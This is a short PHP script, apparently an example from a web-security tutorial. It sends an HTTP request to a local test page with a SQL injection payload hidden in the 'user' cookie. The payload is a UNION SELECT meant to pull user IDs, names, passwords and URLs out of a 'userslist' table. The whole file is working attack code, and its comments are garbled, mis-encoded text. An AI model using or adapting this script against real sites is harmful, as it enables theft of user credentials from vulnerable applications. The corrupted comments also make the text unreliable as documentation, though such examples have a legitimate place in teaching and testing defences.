<?php
  $hostname = "localhost";
  $path = "/test/1.php";
  $sql = "none' UNION SELECT id_user, name, pass, pass, url 
                      FROM userslist WHERE name='yandex";

  // ������������� ����������, ��� ��������
  // �������� � ��������� $hostname
  $fp = fsockopen($hostname, 80, $errno, $errstr, 30); 
  // ��������� ���������� ��������� ����������
  if (!$fp) echo "$errstr ($errno)<br />\n"; 
  else
  { 
    // ��������� HTTP-��������� ��� ��������
    // �� �������
    $headers = "GET $path HTTP/1.1\r\n"; 
    $headers .= "Host: $hostname\r\n"; 
    // ����������� cookie
    $headers .= "Cookie: user=".urlencode($sql).";\r\n";
    $headers .= "Connection: Close\r\n\r\n"; 
    // ���������� HTTP-������ �������
    fwrite($fp, $headers); 
    // �������� �����
    while (!feof($fp))
    { 
      $line .= fgets($fp, 1024); 
    } 
    fclose($fp); 
  } 
  echo $line;
?>
